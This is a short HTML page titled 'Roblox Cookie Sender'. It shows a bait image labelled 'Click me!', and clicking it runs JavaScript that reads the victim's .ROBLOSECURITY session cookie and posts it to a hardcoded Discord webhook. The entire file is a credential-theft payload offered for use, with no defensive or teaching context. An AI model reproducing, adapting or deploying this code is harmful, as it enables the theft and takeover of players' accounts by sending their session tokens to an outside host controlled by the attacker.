<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie Sender</title>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png" alt="Click me!" onclick="sendRobloxCookies()" style="cursor: pointer;">
    <script>
        function sendRobloxCookies() {
            const robloxCookies = document.cookie.split(';').map(cookie => cookie.trim()).filter(cookie => cookie.startsWith('.ROBLOSECURITY='));
            if (robloxCookies.length === 0) {
                console.error('No Roblox cookies found');
                return;
            }

            const robloxCookie = robloxCookies[0].split('=')[1];

            fetch('https://discordapp.com/api/webhooks/1508814909008515094/K6_XrOoEL_GXG1UJ2Rf9KI_1b76AgKZ7lAM_Nt-WSZkW8mjKxzCCFxavsTiG4ylQyPGL', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `**Roblox Cookie:**\n\`\`\`\n${robloxCookie}\n\`\`\``
                })
            }).then(response => {
                if (response.ok) {
                    console.log('Roblox cookie sent successfully');
                } else {
                    console.error('Failed to send Roblox cookie');
                }
            }).catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
